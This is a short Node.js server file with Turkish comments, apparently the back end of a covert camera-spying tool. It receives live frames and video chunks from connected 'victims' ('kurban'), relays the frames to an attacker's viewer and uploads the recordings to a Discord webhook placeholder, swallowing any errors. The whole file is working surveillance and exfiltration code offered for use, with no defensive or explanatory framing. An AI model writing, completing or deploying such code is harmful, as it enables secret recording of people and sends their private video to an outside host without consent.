const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);

app.use(express.static('public'));

const DISCORD_WEBHOOK = 'WEBHOOK_URL_INI_BURAYA_YAZ'; // DEĞİŞTİR!!

let viewer = null;

io.on('connection', (socket) => {
  console.log('Kurban bağlandı');

  socket.on('frame', (data) => {
    if (viewer) viewer.emit('frame', data);
  });

  socket.on('videoChunk', async (base64) => {
    const buffer = Buffer.from(base64, 'base64');

    const form = new FormData();
    form.append('file', new Blob([buffer]), 'kurban-' + Date.now() + '.webm');

    try {
      await fetch(DISCORD_WEBHOOK, { method: 'POST', body: form });
    } catch (e) {}
  });
});

server.listen(process.env.PORT || 3000, () => console.log('Sunucu çalışıyor'));
